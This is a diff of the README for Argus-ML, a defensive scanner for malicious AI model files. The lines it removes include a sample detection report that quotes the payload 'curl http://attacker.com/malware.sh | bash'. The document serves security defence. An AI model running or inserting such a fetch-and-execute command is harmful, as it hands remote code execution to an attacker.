@@ -1,279 +1,136 @@
 # 🛡️ Argus-ML
 
-> Advanced AI/ML Supply Chain Security Scanner for detecting malicious payloads, hidden RCE chains, and weaponized model files.
+**Argus-ML** is a static triage CLI for suspicious AI/ML model artifacts. It combines byte-level indicators with optional PickleScan, Fickling, ModelScan, and HDF5/Keras metadata inspection. It can scan one artifact or recursively scan a directory and export TXT, Markdown, HTML, or JSON reports.
 
----
+> **Important:** `NO_DETECTIONS` does not mean `SAFE`. Static scanning cannot prove that a model, its loader, or its runtime is safe. Argus-ML does not deserialize models itself, but installed third-party parsers still process untrusted files. Use an isolated, patched environment for untrusted samples.
 
-## 📌 Overview
+## What changed in v2
 
-**Argus-ML** is a multi-layered AI model security scanner built to detect Remote Code Execution (RCE), reverse shells, malicious deserialization payloads, and hidden supply chain attacks embedded inside AI/ML model files.
+- Removed source-code API-key placeholders. Provider keys are read from environment variables.
+- Made the banner and AI libraries optional, so static scanning does not fail just because a cosmetic or cloud package is missing.
+- Added timeouts for third-party scanner commands and the HDF5 metadata probe.
+- Added ZIP member/path checks, symlink-entry warnings, archive/member size limits, and bounded recursive scans. Members are inspected through temporary files, not extracted using archive-controlled paths.
+- Scans all relevant embedded pickle/NumPy members within configured limits instead of only the first matching entry.
+- Added cross-chunk byte-pattern matching and SHA-256 output when the entire file was read.
+- Added Keras Lambda-configuration indicators without claiming that a Lambda layer alone proves malware.
+- Removed blanket “safe” treatment for ONNX and Safetensors. Those formats have different risk profiles, but a file extension cannot certify the safety of its parser, framework, or loading pipeline.
+- Added honest `SUSPICIOUS`, `REVIEW`, `INCOMPLETE`, and `NO_DETECTIONS` statuses, JSON output, safer HTML escaping, atomic report writes, and exit codes for automation.
+- Added unit tests for scanner behavior and report safety.
 
-As open-source model distribution becomes the standard across the AI ecosystem, attackers are increasingly abusing formats like Pickle, PyTorch, Keras, GGUF, and ONNX to weaponize models.
+## Requirements
 
-This attack pattern — often called **Model Jacking** — allows threat actors to execute code the moment a model is loaded into memory.
-
-Argus-ML is designed to stop that attack chain *before* the victim runs `load()`.
-
----
-
-# 🔥 Key Features
-
-## 🧠 Multi-Engine Static Analysis
-
-Argus-ML combines multiple detection layers instead of relying on a single scanner.
-
-### Detection Engines
-
-* `pickletools` opcode disassembly
-* `picklescan` signature analysis
-* Universal binary heuristic scanner
-* Payload string extraction
-* Embedded shell detection
-* Suspicious import tracing
-* Dangerous function discovery
-
----
-
-## 🤖 AI-Powered Threat Intelligence
-
-Argus-ML can leverage multiple LLM providers to explain:
-
-* Attacker intent
-* Payload behavior
-* Exploitation flow
-* Persistence logic
-* Reverse shell execution chains
-* Supply chain impact
-
-### Supported AI Providers
-
-* NVIDIA Build (Llama 3.1 / 3.3)
-* Google Gemini
-* OpenAI
-
-The scanner automatically falls back between providers if one is unavailable.
-
----
-
-## 📦 Universal Model Format Support
-
-### Pickle-Based Formats
-
-* `.pkl`
-* `.pickle`
-* `.pk1`
-* `.pt`
-* `.pth`
-* `.bin`
-* `.joblib`
-
-### Scientific Formats
-
-* `.npy`
-* `.npz`
-
-### Deep Learning Formats
-
-* `.h5`
-* `.hdf5`
-* `.keras`
-* `.pb`
-
-### Modern LLM Formats
-
-* `.safetensors`
-* `.gguf`
-* `.onnx`
-
-### Advanced Detection Capabilities
-
-* Detects suspicious pickle opcodes
-* Detects embedded shell payloads
-* Detects malicious deserialization chains
-* Detects suspicious command execution patterns
-* Scans internal PyTorch ZIP pickles automatically
-
----
-
-# 🚀 Installation
-
-Ensure you have **Python 3.10+** installed.
-
-## Clone Repository
+- Python 3.10 or newer for the core CLI. Python 3.10–3.12 is recommended for the complete optional scanner stack because ModelScan currently has a narrower tested Python range.
+- Install optional scanning engines using `requirements.txt`. If an engine is absent, Argus-ML records the resulting coverage limitation rather than pretending the scan was comprehensive.
+- AI packages are only needed when using AI-assisted triage.
 
 ```bash
 git clone https://github.com/giriaryan694-a11y/argus-ml.git
 cd argus-ml
+python -m pip install -r requirements.txt
 ```
 
-## Install Dependencies
+For strongest isolation, run scans in a disposable VM or a locked-down container with no network access and no sensitive host mounts. Keep Python and all scanner dependencies patched. Do not open or load a model merely because a report has no findings.
+
+## Usage
+
+### Scan one artifact
 
 ```bash
-pip install -r requirements.txt
+python argus-ml.py --target ./models/model.pt --no-ai
 ```
 
----
-
-# ⚙️ Configuration
-
-Open `argus-ml.py` and configure your API keys.
-
-```python
-nvidia_build_api_key = "YOUR_NV_KEY"
-gemini_api_key = "YOUR_GEMINI_KEY"
-openai_api_key = "YOUR_OPENAI_KEY"
-```
-
-Argus-ML includes automatic provider fallback logic.
-
-If one provider fails or is missing, the scanner attempts the next available engine automatically.
-
----
-
-# 📖 Usage
-
-## 🔍 Scan a Single Model
+### Scan a directory and create an HTML report
 
 ```bash
-python argus-ml.py --target malicious_model.pt --provider nvidia
+python argus-ml.py --dir ./models --output reports/argus --filetype html --no-ai
 ```
 
----
-
-## 📂 Scan an Entire Directory (Recursive)
+### Generate machine-readable JSON
 
 ```bash
-python argus-ml.py --dir ./models --output security_report --ft html
+python argus-ml.py --dir ./models --output reports/argus --filetype json --no-ai
 ```
 
----
-
-## ⚡ Static Analysis Only
-
-Run without AI providers:
+### Tune resource limits
 
 ```bash
-python argus-ml.py --target weight_file.bin --no-ai
+python argus-ml.py --target ./models/model.pt \
+  --max-file-size-mb 8192 \
+  --max-member-size-mb 128 \
+  --max-archive-size-mb 2048 \
+  --max-archive-members 10000 \
+  --no-ai
 ```
 
----
+For a file larger than `--max-file-size-mb`, Argus-ML performs a capped byte scan and skips deep parsers. The default file cap is 8192 MiB. Use `--max-file-size-mb 0` to disable that cap deliberately. ZIP scanning separately limits each selected member and their combined declared uncompressed size to reduce ZIP-bomb risk; large tensor-weight entries that are not inspected do not consume the selected-member budget. Limits can cause an `INCOMPLETE` result; do not interpret that as a clean scan.
 
-# 📊 Real-World Detection Example
+### AI-assisted triage (optional)
 
-When scanning a malicious PyTorch sample like `devsforcode.pt`, Argus-ML immediately identifies the embedded exploit chain.
+API keys are read from environment variables. Use the provider-specific variable, for example:
 
-```plaintext
-[!] Detected PyTorch ZIP Archive format.
-[*] Running static analysis...
+**Linux/macOS**
 
-Dangerous opcodes found:
-  [CRITICAL] STACK_GLOBAL: posix system
-  [CRITICAL] REDUCE: executes loaded function with arguments
-
-Suspicious strings:
-  [CRITICAL] PAYLOAD: 'curl http://attacker.com/malware.sh | bash'
-
-Verdict: UNSAFE - Malicious Code/Payloads Detected.
-
-=== AI Analysis (NVIDIA - Llama-3.1-8b) ===
-1. Command Logic: The attacker is using 'curl' to fetch a remote shell script and piping it directly into 'bash' for immediate execution.
-2. Impact: Full Remote Code Execution (RCE). The attacker gains a shell on the host machine as soon as the model is loaded into a Python environment.
+```bash
+export ARGUS_OPENAI_API_KEY="your-key"
+python argus-ml.py --target ./models/model.pt --provider openai
 ```
 
----
+**PowerShell**
 
-# 🖼️ Demo Screenshots
+```powershell
+$env:ARGUS_OPENAI_API_KEY = "your-key"
+python .\argus-ml.py --target .\models\model.pt --provider openai
+```
 
-## Detection Results
+Supported variables:
 
-![Detection Screenshot 1](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/1.png)
+| Provider | Preferred environment variable | Also accepted |
+|---|---|---|
+| OpenAI | `ARGUS_OPENAI_API_KEY` | `OPENAI_API_KEY` |
+| Google Gemini | `ARGUS_GEMINI_API_KEY` | `GEMINI_API_KEY`, `GOOGLE_API_KEY` |
+| NVIDIA | `ARGUS_NVIDIA_API_KEY` | `NVIDIA_API_KEY` |
 
-![Detection Screenshot 2](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/2.png)
+The AI feature sends **finding metadata only**, not model bytes or extracted payload snippets. Provider requests may still incur charges and are subject to each provider's terms. Set `--no-ai` to disable cloud analysis completely. Model identifiers change over time; use `--model MODEL_ID` to override a provider's default when needed.
 
----
+## Supported file families
 
-## API Configuration
+Argus-ML can accept the following extensions; detection depth varies by format and installed engine:
 
-![API Config](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/api.png)
+- Pickle-derived: `.pkl`, `.pickle`, `.pk1`, `.pt`, `.pth`, `.bin`, `.joblib`
+- NumPy: `.npy`, `.npz`
+- HDF5/Keras/TensorFlow: `.h5`, `.hdf5`, `.keras`, `.pb`
+- Other model formats: `.safetensors`, `.gguf`, `.onnx`
 
----
+This extension list is not a promise that every engine understands every format. In particular, ONNX, GGUF, and Safetensors receive limited heuristic inspection in this version. A Safetensors file avoids the ordinary pickle deserialization path when used correctly, but downstream loaders, runtimes, custom operations, dependencies, and model provenance still matter.
 
-# 🎯 Threat Model
+## Interpreting status and exit codes
 
-Argus-ML is designed against modern AI supply chain attack patterns including:
+| Status | Meaning |
+|---|---|
+| `SUSPICIOUS` | High/critical indicators or a scanner-reported issue requires investigation. This is not automatically proof of successful exploitation. |
+| `REVIEW` | Medium/low indicators were found. Validate context and benign explanations. |
+| `INCOMPLETE` | Important checks were skipped, failed, timed out, or were unavailable. |
+| `NO_DETECTIONS` | No indicators were found by the checks that completed. This is not a safety certification. |
 
-* Weaponized Pickle deserialization
-* Reverse shell execution payloads
-* Malicious model repositories
-* Dependency confusion delivery chains
-* Embedded downloader malware
-* Hidden command execution
-* GGUF metadata exploitation
-* Unsafe PyTorch archives
-* AI model trojans
-* Loader-triggered RCE
+CLI exit codes:
 
----
+- `0`: No findings and no known scan limitations.
+- `1`: At least one artifact has a `SUSPICIOUS` or `REVIEW` status.
+- `2`: Input, coverage, or scan-completion problem.
 
-# 🛠️ Security Philosophy
+Directory scans only select files with supported extensions. Single-file scans accept any regular file and report when only byte-level heuristics apply. Symbolic-link inputs are rejected to avoid silently scanning outside the requested scope.
 
-Traditional malware scanners were never designed for AI model ecosystems.
+## Detection engines and limitations
 
-Argus-ML focuses specifically on:
+- **Binary heuristics:** looks for selected command-execution and dynamic-loading strings. These are indicators, not proof; compressed or obfuscated content may evade them, and benign files can contain matching strings.
+- **PickleScan and Fickling:** analyze pickle-derived content without asking Argus-ML to load the model.
+- **ModelScan:** adds format-aware detection where supported by its installed version.
+- **HDF5/Keras metadata:** checks model/layer configuration attributes in a separate Python process with a timeout.
+- **Keras Lambda indicator:** reported as a review item because risks depend on the serialized content and loading configuration. It is not inherently proof of malicious code.
+- **AI analysis:** advisory only; it can be wrong and never overrides scanner evidence or scan limitations.
 
-* AI model attack surfaces
-* Serialization abuse
-* ML supply chain compromise
-* Deserialization-based RCE
-* Model trust exploitation
-* AI repository poisoning
+No scanner catches every malicious artifact. Review model provenance, hashes/revisions, framework loading flags, custom layers/operators, dependencies, and the environment in which the artifact will run.
 
-The goal is simple:
+## License
 
-> Never trust a model file blindly.
-
----
-
-# ⚖️ License
-
-Licensed under the **Apache License 2.0**.
-
-See the `LICENSE` file for full details.
-
----
-
-# 🔗 Repository
-
-GitHub Repository:
-
-[https://github.com/giriaryan694-a11y/argus-ml](https://github.com/giriaryan694-a11y/argus-ml)
-
----
-
-# 👨‍💻 Author
-
-Developed by **Aryan Giri**
-
-Focused on:
-
-* AI Security
-* Offensive Security
-* Supply Chain Defense
-* Model Malware Analysis
-* LLM Threat Research
-
----
-
-# ⭐ Why Argus-ML Matters
-
-The AI ecosystem is rapidly becoming the next major supply chain battlefield.
-
-Attackers no longer need phishing emails when they can hide malware directly inside model weights downloaded by developers worldwide.
-
-Argus-ML helps security researchers, developers, red teamers, and AI engineers inspect model files before they become initial access vectors.
-
----
-
-# 🌟 Star the Repository
-
-If you found this project useful, consider starring the repository and contributing to the future of AI supply chain security.
+Licensed under the Apache License 2.0. See `LICENSE`.
